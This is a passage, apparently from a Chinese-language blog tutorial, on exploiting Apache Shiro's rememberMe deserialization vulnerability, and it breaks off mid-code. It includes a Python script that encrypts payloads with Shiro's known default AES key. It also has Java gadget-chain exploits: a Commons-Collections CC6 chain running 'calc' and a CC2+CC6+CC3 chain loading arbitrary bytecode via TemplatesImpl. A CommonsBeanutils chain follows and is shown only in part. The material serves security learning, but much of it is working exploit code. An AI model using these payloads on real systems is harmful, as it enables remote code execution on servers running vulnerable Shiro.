class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>AESåŠ å¯†çš„è„šæœ¬</strong></p><p>ç½‘ä¸Šæ‰¾çš„ä¸€ä¸ªè„šæœ¬ï¼š<a href="https://xz.aliyun.com/t/12702?time__1311=mqmhDvox8FGNDQtiQGkI50Qc30Ki=sF54D&alichlgref=https://www.google.com/#toc-1">https://xz.aliyun.com/t/12702?time__1311=mqmhDvox8FGNDQtiQGkI50Qc30Ki%3DsF54D&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-1</a></p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file_data</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read()<br>    <span class="hljs-keyword">return</span> data<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_enc</span>(<span class="hljs-params">data</span>):<br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s:s +((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(base64.b64decode(key),mode,iv)<br>    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))<br>    <span class="hljs-keyword">return</span> ciphertext<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_dec</span>(<span class="hljs-params">enc_data</span>):<br>    enc_data = base64.b64encode(enc_data)<br>    unpad = <span class="hljs-keyword">lambda</span> s : s[:-s[-<span class="hljs-number">1</span>]]<br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv = enc_data[:<span class="hljs-number">16</span>]<br>    encryptor = AES.new(base64.b64decode(key),mode,iv)<br>    plaintext = encryptor.decrypt(enc_data[<span class="hljs-number">16</span>:])<br>    plaintext = unpad(plaintext)<br>    <span class="hljs-keyword">return</span> plaintext<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    data = get_file_data(<span class="hljs-string">&quot;ser.bin&quot;</span>)<br>    <span class="hljs-built_in">print</span>(aes_enc(data))<br></code></pre></td></tr></table></figure><blockquote><p>è¿™ä¸ªCryptoåº“æœ‰ç‚¹å‘ï¼Œç¬¬ä¸€æ¬¡ç”¨ï¼Œè®°å½•ä¸€ä¸‹</p><p>å…ˆå®‰è£…ä¸‹é¢è¿™ä¸ªåº“</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pip3 install pycryptodome<br></code></pre></td></tr></table></figure><p>ç„¶åéœ€è¦å»c:\users\86189\appdata\local\programs\python\python37\lib\site-packagesè·¯å¾„ä¸‹å°†ä¸€ä¸ªcryptoçš„æ–‡ä»¶å¤¹çš„cæ”¹æˆå¤§å†™çš„Cå³å¯</p></blockquote><p><strong>å›ºå®šå¯†é’¥</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">kPH+bIxk5D2deZiIxcaaaA==<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å…ˆæ‰“ä¸€ä¸ªcc6çš„é“¾å­è¯•ä¸€è¯•</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc6_demo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        Map&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<span class="hljs-comment">//è¿™é‡Œå…ˆéšä¾¿èµ‹ä¸€ä¸ªå€¼åé¢æ”¹å›æ¥</span><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<span class="hljs-comment">//è¿™é‡Œå¾…ä¼šè°ƒç”¨çš„æ—¶å€™ä¼šåœ¨mpaæ–°å¢åŠ ä¸€ä¸ªé”®å€¼å¯¹aaa</span><br>        Map&lt;Object,Object&gt; hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">lazyMapClass</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        Field trans=lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        trans.setAccessible(<span class="hljs-literal">true</span>);<br>        trans.set(lazyMap,chainedTransformer);<span class="hljs-comment">//è¿™é‡Œæ”¹å›æ¥chainedTransformer</span><br>        map.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<span class="hljs-comment">//ç§»é™¤æ‰æˆ‘ä»¬æ–°å¢çš„é”®å€¼</span><br><br>        serialize(hashMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object obj=ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå°†ç”Ÿæˆçš„ser.binæ–‡ä»¶è¿›è¡ŒaesåŠ å¯†åå†base64è¿›è¡Œä¼ å‚</p><blockquote><p>è¿™é‡Œæˆ‘ä¸€å¼€å§‹è¯•äº†ä¸€ä¸‹ç”¨cyberchefæ¥åŠ å¯†å‘ç°ä¸è¡Œï¼Œè¿˜æ˜¯å¾—ç”¨ä¸Šé¢çš„è„šæœ¬</p></blockquote><p>å…ˆçœ‹ä¸€ä¸‹æ­£å¸¸çš„ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151444243.png" alt="image-20240614215924819"></p><p>æ‰“äº†cc6çš„ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151444244.png" alt="image-20240614220816682"></p><p>è¿™é‡Œå°±æ˜¯æ²¡ç™»å½•ä¸Šå»æ˜¯æ­£å¸¸çš„ï¼Œåç«¯å¼€å¯debugå»çœ‹ä¸€ä¸‹ï¼Œè¿™æ—¶å€™åº”è¯¥æ˜¯æœ‰æŠ¥é”™çš„</p><p><img src="http://cdn.clown2024.cn/202407151444245.png" alt="image-20240614232811726"></p><p>è¿™é‡Œæ˜¯ååºåˆ—åŒ–æŠ›äº†å¼‚å¸¸ï¼Œè¯´æ˜¯æ— æ³•åŠ è½½invokerTransformerï¼Œå°±æ˜¯ç”±äºshiroæ— æ³•å¤„ç†æ•°ç»„å¯¼è‡´çš„ï¼Œåé¢å†è¯´ï¼Œæ¯”è¾ƒå¤æ‚</p><blockquote><p>ä½†æ˜¯è¿™é‡ŒæŠ¥é”™çš„åˆä¸å¤ªå¯¹å•Šï¼Œä»–æ˜¯ccçš„å…¨éƒ¨ç±»éƒ½æ— æ³•åŠ è½½ï¼Œå¤ªæ€ªäº†</p></blockquote><p>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å°±éœ€è¦æ”¹ä¸€ä¸‹é“¾å­ï¼Œæ”¹æˆä¸ç”¨chainedTransformeræ•°ç»„çš„å½¢å¼ï¼Œä¹Ÿå°±æ˜¯æ‹¼ä¸€ä¸‹é“¾å­å°±å¥½ï¼Œç„¶åæœ€åè¦æ”¹æˆ<strong>åŠ¨æ€ç±»åŠ è½½æ‰§è¡Œä»»æ„ä»£ç çš„æ–¹å¼</strong></p><p>è¿™é‡Œä½¿ç”¨<strong>cc2+cc6+cc3</strong>çš„æ–¹å¼è¿›è¡Œæ‹¼æ¥</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shiro_ccDemo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//cc3</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-comment">//åˆ©ç”¨åå°„è®¾ç½®éœ€è¦æ»¡è¶³çš„å€¼</span><br>        Class c=templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\code\\cc_chain\\src\\main\\java\\com.proxy\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>        bytecodes.set(templates,codes);<br>        <span class="hljs-comment">//cc2</span><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br>        <span class="hljs-comment">//cc6</span><br>        Map&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<span class="hljs-comment">//è¿™é‡Œå…ˆéšä¾¿èµ‹ä¸€ä¸ªå€¼åé¢æ”¹å›æ¥</span><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, templates);<span class="hljs-comment">//è¿™é‡Œè¦æ·»åŠ è¿›å»templates</span><br>        Map&lt;Object,Object&gt; hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">lazyMapClass</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        Field trans=lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        trans.setAccessible(<span class="hljs-literal">true</span>);<br>        trans.set(lazyMap,invokerTransformer);<span class="hljs-comment">//è¿™é‡Œæ”¹å›æ¥chainedTransformer</span><br>        map.remove(templates);<span class="hljs-comment">//ç§»é™¤æ‰æˆ‘ä»¬æ–°å¢çš„é”®å€¼</span><br><br>        serialize(hashMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object obj=ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœäº†è¿™é‡Œä¹Ÿæ²¡æ‰“é€šï¼Œåå°ç›´æ¥æŠ¥é”™TiedMapEntryéƒ½æ— æ³•åŠ è½½</p><p>åæ¥æˆ‘ç”¨äº†pç¥çš„ç¯å¢ƒå°±èƒ½æ‰“é€šäº†ï¼Œä¼°è®¡è¿˜æ˜¯ccä¾èµ–è¿è¡Œæ—¶æ²¡æœ‰è¢«ç¼–è¯‘è¿›å»</p><p>è¿™æ˜¯pç¥çš„ç¯å¢ƒï¼š<a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">https://github.com/phith0n/JavaThings/tree/master/shirodemo</a></p><p><img src="http://cdn.clown2024.cn/202407151444246.png" alt="image-20240615104853896"></p><blockquote><p>æ‰“çš„æ—¶å€™è¦å»æ‰<strong>JSESSIONID</strong></p></blockquote><h2><span id="æ‰“cbé“¾">æ‰“CBé“¾</span></h2><p>CBé“¾æ‰“çš„æ˜¯shiroè‡ªå¸¦çš„ä¾èµ–ï¼šcommons-beanutilsï¼ˆå°±æ˜¯å¯¹javabeançš„å¢å¼ºç±»ï¼‰ï¼Œè¿™é‡Œæ³¨æ„ä¸€ä¸‹ç‰ˆæœ¬æ˜¯1.8.3çš„ï¼Œæœ¬åœ°å†™expçš„æ—¶å€™è®°å¾—ç‰ˆæœ¬ä¹Ÿè¦ä¸€è‡´ï¼Œä¸ç„¶ä¼šæ‰“ä¸é€š</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„javaBeançš„ä¾‹å­</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shiro_CBDemo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-number">10</span>,<span class="hljs-string">&quot;aa&quot;</span>);<br>        System.out.println(PropertyUtils.getProperty(person, <span class="hljs-string">&quot;age&quot;</span>));<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä¸éœ€è¦å†å»è°ƒç”¨getæ–¹æ³•æ¥è·å–å±æ€§å€¼ï¼Œè€Œæ˜¯ç›´æ¥ç”¨PropertyUtilsçš„é™æ€æ–¹æ³•æ¥è·å–</p><p>ç„¶ååœ¨è¿™å¤„ç†çš„è¿‡ç¨‹ä¸­å°±å­˜åœ¨ååºåˆ—åŒ–çš„ç‚¹ï¼Œå°±ç›´æ¥è¯´äº†ååºåˆ—åŒ–çš„ç‚¹å°±æ˜¯ä¼šè°ƒç”¨javaBeançš„getæ–¹æ³•ï¼Œæ¯”å¦‚ä¸Šé¢çš„ageå°±ä¼šè°ƒç”¨<strong>getAge</strong>æ–¹æ³•</p><p>æˆ‘ä»¬å¯ä»¥è°ƒè¯•è·Ÿè¿›å»çœ‹ä¸€ä¸‹æˆ‘ä»¬ä¼ å…¥äº†nameä¸ºâ€ageâ€ä¹‹åå‘ç”Ÿäº†ä»€ä¹ˆ</p><p>ä¸€è·¯è·Ÿè¿›ä¸‹å»ï¼Œä¼šåœ¨ä¸€ä¸ªgetSimplePropertyçš„æ–¹æ³•é‡Œé¢è·å–åˆ°javaBeançš„å„ç§æ–¹æ³•ï¼Œç„¶åä¼šæŠŠæˆ‘ä»¬ä¼ è¿›å»çš„åå­—ä»å°å†™æ”¹æˆå¤§å†™</p><blockquote><p>è€Œä¸”æˆ‘ä»¬è¿™é‡Œä¸ä¼ å¤§å†™çš„å±æ€§åè¿›å»ï¼Œä¸ç„¶ä¼šæŠ¥é”™</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151444247.png" alt="image-20240615093151593"></p><p>å†å¾€ä¸‹ä¸¤è¡Œï¼Œä»–å°±è·å–äº†è¯»å–å±æ€§çš„getæ–¹æ³•ï¼Œç„¶åè¿›è¡Œå‡½æ•°è°ƒç”¨ï¼Œè·å–äº†ageçš„å€¼</p><p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240615093518572.png" alt="image-20240615093518572"></p><p>æˆ‘ä»¬ä¼ è¿›å»çš„javaBeanæœ€ç»ˆå°±ä¼šå˜æˆæˆ‘ä»¬æŒ‡å®šçš„å±æ€§çš„å€¼ç„¶åè¿”å›</p><p><img src="http://cdn.clown2024.cn/202407151444248.png" alt="image-20240615093640915"></p><p><img src="http://cdn.clown2024.cn/202407151444249.png" alt="image-20240615093725798"></p><p>è¿™é‡Œå…¶ä¸­å­˜åœ¨çš„åˆ©ç”¨ç‚¹å°±æ˜¯è¿™ä¸ªgetæ–¹æ³•çš„è°ƒç”¨</p><h3><span id="templatesimpl">TemplatesImpl</span></h3><p>è¿™é‡Œå°±è·Ÿæˆ‘ä»¬åŠ¨æ€ç±»åŠ è½½ä»»æ„ä»£ç çš„è¿™ä¸ªç±»æœ‰å…³</p><p>å®ƒé‡Œé¢æœ‰ä¸€ä¸ª<strong>getOutputProperties()<strong>çš„æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•çš„å°±å¾ˆç¬¦åˆjavaBeançš„æ–¹å¼ï¼Œæœ€é‡è¦çš„æ˜¯å®ƒé‡Œé¢è¿˜è°ƒç”¨äº†</strong>newTransformer</strong>è¿™ä¸ªæ–¹æ³•</p><p><img src="http://cdn.clown2024.cn/202407151444250.png" alt="image-20240615094412956"></p><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ä¼ ä¸€ä¸ª<strong>outputProperties</strong>çš„åå­—è¿›å»å°±å¯ä»¥è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œè®°å¾—è¿™é‡Œä¸€å®šè¦æ˜¯<strong>å°å†™</strong>çš„å½¢å¼</p><h3><span id="beancomparator">BeanComparator</span></h3><p>æ¥ä¸‹æ¥å°±æ˜¯ä»<strong>ProperUtils</strong>å¾€ä¸Šæ‰¾çœ‹è°è°ƒç”¨äº†ä»–çš„<strong>getProperty</strong>æ–¹æ³•</p><p>è¿™é‡Œå°±æ‰¾åˆ°BeanComparatorçš„compareæ–¹æ³•</p><p><img src="http://cdn.clown2024.cn/202407151444251.png" alt="image-20240615094845997"></p><p>çœ‹ä¸€ä¸‹ä»–çš„æ„é€ æ–¹æ³•</p><p><img src="http://cdn.clown2024.cn/202407151444252.png" alt="image-20240615095155801"></p><p>è¿™é‡Œä¹Ÿæå‰è¯´ä¸€ä¸‹ï¼Œæˆ‘ä»¬éœ€è¦è°ƒç”¨ä¸‹é¢çš„æ„é€ æ–¹æ³•ï¼Œè€Œä¸èƒ½è°ƒç”¨ä¸Šé¢çš„ï¼Œå› ä¸ºä¸Šé¢çš„ComparableComparatoræ˜¯å±äºCommoms-Collectionsé‡Œé¢çš„æ–¹æ³•ï¼Œè€Œshiroè‡ªå¸¦æ˜¯æ²¡æœ‰è¿™ä¸ªçš„ï¼Œæˆ‘ä»¬æ‰“äº†å°±ä¼šæŠ¥é”™</p><p>æ‰€ä»¥è¿™é‡Œcomparatoræˆ‘ä»¬å°±éœ€è¦èµ‹å€¼ä¸€ä¸ªjavaæœ¬èº«å°±æœ‰çš„è€Œä¸”æ˜¯ç»§æ‰¿äº†åºåˆ—åŒ–æ¥å£çš„ç±»ï¼Œè¿™é‡Œç›´æ¥ç”¨ç»„é•¿è§†é¢‘é‡Œé¢ç”¨çš„é‚£ä¸ª<strong>AttrCompare</strong>ç±»</p><h3><span id="priorityqueue">PriorityQueue</span></h3><p>è§åˆ°è¿™ä¸ªcompareå°±å¾ˆç†Ÿæ‚‰äº†ï¼Œæˆ‘ä»¬çš„cc2å’Œcc4é‡Œé¢å°±æ˜¯åˆ©ç”¨äº†PriorityQueueçš„readObjectæ–¹æ³•ï¼Œç„¶åé‡Œé¢è°ƒç”¨compareæ–¹æ³•çš„ï¼Œé‚£é“¾å­å°±åŸºæœ¬ä¸²èµ·æ¥äº†</p><p>ç°åœ¨å¯ä»¥æ¥å†™ä¸€ä¸ªexp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.cc_chain.shiro_cb;<br><br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shiro_CBDemo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><span class="hljs-comment">//        Person person = new Person(10,&quot;aa&quot;);</span><br><span class="hljs-comment">//        System.out.println(PropertyUtils.getProperty(person, &quot;age&quot;));</span><br>        <span class="hljs-comment">//cc3</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-comment">//åˆ©ç”¨åå°„è®¾ç½®éœ€è¦æ»¡è¶³çš„å€¼</span><br>        Class c=templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\code\\cc_chain\\src\\main\\java\\com.proxy\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>        bytecodes.set(templates,codes);<br><span class="hljs-comment">//        Field tfactory = 